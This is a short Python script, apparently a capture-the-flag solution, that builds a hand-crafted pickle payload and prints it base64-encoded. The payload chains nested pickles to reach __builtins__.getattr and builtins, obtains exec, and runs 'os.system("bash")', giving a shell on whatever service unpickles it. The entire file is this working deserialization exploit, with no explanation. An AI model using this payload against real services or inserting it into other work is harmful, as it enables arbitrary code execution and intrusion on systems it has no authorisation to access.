from base64 import *


def to_binbytes(b: bytes):
    return b"\x8e" + len(b).to_bytes(8, "little") + b


pkl_getattr = (
    b"\x80\x04c__main__\naaaa\n0c__main__\nbbbb\n0c__main__\n__builtins__.getattr\n."
)
pkl_builtins = b"\x80\x04c__main__\naaaa\n0c__main__\nbbbb\n0c__main__\n__builtins__\n."
pkl = (
    b"\x80\x04c__main__\nfleg\n0c__main__\nflog\n0c__main__\nNotAPickle\n222"
    + to_binbytes(pkl_getattr)
    + b"\x85R)R"
    + b"p0\n0"  # memo[0] = getattr, pop
    + to_binbytes(pkl_builtins)
    + b"\x85R)R"
    + b"p1\n0"  # memo[1] = builtins, pop
    + b"g0\n"
    + b"g1\n"
    + b"Vexec\n"
    + b"\x86R"
    + to_binbytes(b'import os;os.system("bash")')
    + b"\x85R"
    + b"."
)


print(b64encode(pkl))
